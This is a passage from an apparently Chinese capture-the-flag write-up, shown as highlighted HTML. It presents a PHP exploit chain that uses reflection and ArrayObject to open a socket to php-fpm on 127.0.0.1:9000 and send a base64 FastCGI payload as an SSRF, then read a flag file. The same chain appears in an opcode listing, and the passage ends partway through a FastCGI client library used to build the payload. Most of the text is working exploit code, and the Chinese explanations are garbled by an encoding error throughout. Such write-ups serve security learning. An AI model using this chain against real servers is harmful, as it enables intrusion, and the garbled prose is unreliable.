invoke__">bin2hex</span>(<span class="variable">$contents</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/flag.txt&#x27;</span>));</span><br></pre></td></tr></table></figure><p>å…·ä½“å°±æ˜¯è¦å®ç°è¿™ä¹ˆä¸€ä¸ªé€»è¾‘,åªä¸è¿‡fpmdataæ¶‰åŠä¸å¯è§å­—ç¬¦,é€‰æ‹©ä½¿ç”¨base64ä¼ é€’</p><h2 id="arrayobjectçš„å¦™ç”¨"><span id="arrayobjectçš„å¦™ç”¨"> ArrayObjectçš„å¦™ç”¨</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fpmdata</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;your_fpmdata&#x27;</span>);</span><br><span class="line"><span class="variable">$fsockopen</span> = <span class="keyword">new</span> <span class="title class_">Reflection</span>(<span class="string">&#x27;fsockopen&#x27;</span>);</span><br><span class="line"><span class="variable">$sock</span> = <span class="variable">$fsockopen</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>([<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">9000</span>]);</span><br><span class="line"><span class="variable">$arg_array</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>([<span class="string">&#x27;&#x27;</span>]);</span><br><span class="line"><span class="variable">$arg_array</span>-&gt;<span class="title function_ invoke__">offsetUnset</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$arg_array</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="variable">$arg_array</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$fpmdata</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">iterator_to_array</span>(<span class="variable">$arg_array</span>);</span><br><span class="line"><span class="variable">$fwrite</span> = <span class="keyword">new</span> <span class="title class_">Reflection</span>(<span class="string">&#x27;fwrite&#x27;</span>);</span><br><span class="line"><span class="variable">$fwrite</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">fflush</span>(<span class="variable">$sock</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$arg_array_1</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>([<span class="string">&#x27;&#x27;</span>]);</span><br><span class="line"><span class="variable">$arg_array_1</span>-&gt;<span class="title function_ invoke__">offsetUnset</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$arg_array_1</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="variable">$arg_array_1</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$length</span>);<span class="comment">//é€šè¿‡å¤–é¢ä¼ è¿›æ¥,å‡ºé¢˜äººexpè®¾ç½®ä¸º8</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">iterator_to_array</span>(<span class="variable">$arg_array_1</span>);</span><br><span class="line"><span class="variable">$fread</span> = <span class="keyword">new</span> <span class="title class_">Reflection</span>(<span class="string">&#x27;fread&#x27;</span>);</span><br><span class="line"><span class="variable">$socks_read</span> = <span class="variable">$fread</span>-&gt;<span class="title function_ invoke__">invokeArgs</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$socks_read</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$socks_read</span>);<span class="comment">//å°†è¿”å›æ•°æ®è½¬æˆåå…­è¿›åˆ¶,é˜²æ­¢å¥‡æ€ªçš„ä¸œè¥¿</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$socks_read</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/flag.txt&#x27;</span>));<span class="comment">#å†™ä¸å†™éƒ½è¡Œ,åæ­£é‡è¦çš„éƒ¨åˆ†å·²ç»å®Œæˆäº†</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”±äºfsockopenåœ¨é¢˜ç›®åˆ›å»ºçš„å¯¹è±¡,æˆ‘ä»¬ä¸èƒ½å¤Ÿç›´æ¥ä¼ é€’ç»™å‡½æ•°ä½œä¸ºå‚æ•°,é‚£ä¹ˆæˆ‘ä»¬åªèƒ½é€šè¿‡ArrayObjectæ–¹æ³•,å°è£…æˆ‘ä»¬çš„å¯¹è±¡.</p><p><code>Arrayobject</code>å¯ä»¥ä½¿ç”¨<code>append</code>æ–¹æ³•æ·»åŠ å…ƒç´ ,ä½¿ç”¨<code>offsetUnset</code>ç§»é™¤æŒ‡å®šç´¢å¼•å†…å®¹.åŒæ—¶ä½¿ç”¨<code>iterator_to_array</code>å¯ä»¥å°†<code>ArrayObject</code>å¯¹è±¡è½¬æˆæ•°ç»„.</p><p>è¿™æ ·å°±å¯ä»¥é€šè¿‡åå°„è°ƒç”¨<code>fwrite</code>,ä½¿ç”¨æ•°ç»„ä¼ é€’å‚æ•°.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CALL base64_decode fpm_data fpm_data</span><br><span class="line"></span><br><span class="line">NEW ReflectionFunction fsockopen fsockopen</span><br><span class="line">ICALL fsockopen invokeArgs fsockopen_args sock<span class="comment">#fsockopen_args = [&#x27;127.0.0.1&#x27;,&quot;9000&quot;]</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆåå°„è°ƒç”¨fsockopen,è¿”å›ä¸€ä¸ªsockå¯¹è±¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">CALL base64_decode fpm_data fpm_data</span><br><span class="line"></span><br><span class="line">    NEW ReflectionFunction fsockopen fsockopen</span><br><span class="line">    ICALL fsockopen invokeArgs fsockopen_args sock</span><br><span class="line"></span><br><span class="line">    NEW ArrayObject arg_array arg_array</span><br><span class="line">    ICALL arg_array offsetUnset offset _</span><br><span class="line">    ICALL arg_array append sock _</span><br><span class="line">    ICALL arg_array append fpm_data _</span><br><span class="line">    CALL iterator_to_array arg_array data</span><br><span class="line">    NEW ReflectionFunction fwrite fwrite</span><br><span class="line">    ICALL fwrite invokeArgs data _</span><br><span class="line"></span><br><span class="line">    CALL fflush sock _</span><br><span class="line"></span><br><span class="line">    NEW ArrayObject arg_array_1 arg_array_1</span><br><span class="line">    ICALL arg_array_1 offsetUnset offset _</span><br><span class="line">    ICALL arg_array_1 append sock _</span><br><span class="line">    ICALL arg_array_1 append length _</span><br><span class="line">    CALL iterator_to_array arg_array_1 data</span><br><span class="line">    NEW ReflectionFunction fread fread</span><br><span class="line">    ICALL fread invokeArgs data socks_read</span><br><span class="line"></span><br><span class="line">    CALL bin2hex socks_read socks_read</span><br><span class="line">    CALL var_dump socks_read _</span><br><span class="line"></span><br><span class="line">    CALL file_get_contents file_arg r1</span><br><span class="line">    CALL var_dump r1 _</span><br></pre></td></tr></table></figure><p>å…¶å®fflushåé¢çš„å†…å®¹éƒ½å¯ä»¥ä¸è¦,è¿™é‡Œå†™å‡ºæ¥å¯èƒ½å°±æ˜¯ä¸ºäº†çœ‹æ¸…å›æ˜¾,ä½†å…¶å®fwriteå°±å·²ç»æˆåŠŸè¿›è¡ŒSSRFåˆ©ç”¨äº†,</p><h2 id="fpmç”Ÿæˆ"><span id="fpmç”Ÿæˆ"> fpmç”Ÿæˆ</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">VERSION_1</span>            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">BEGIN_REQUEST</span>        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ABORT_REQUEST</span>        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">END_REQUEST</span>          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">PARAMS</span>               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDIN</span>                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDOUT</span>               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">STDERR</span>               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DATA</span>                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">GET_VALUES</span>           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">GET_VALUES_RESULT</span>    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">UNKNOWN_TYPE</span>         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAXTYPE</span>              = <span class="built_in">self</span>::<span class="variable constant_">UNKNOWN_TYPE</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">RESPONDER</span>            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">AUTHORIZER</span>           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">FILTER</span>               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">REQUEST_COMPLETE</span>     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">CANT_MPX_CONN</span>        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">OVERLOADED</span>           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">UNKNOWN_ROLE</span>         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAX_CONNS</span>            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MAX_REQS</span>             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MPXS_CONNS</span>           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">HEADER_LEN</span>           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_keepAlive &amp;&amp; <span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_sock = <span class="title function_ invoke__">stream_socket_client</span>(<span class="variable">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">chr</span>(<span class="built_in">self</span>::<span class="variable constant_">VERSION_1</span>)         <span class="comment">/* version */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = <span class="title function_ 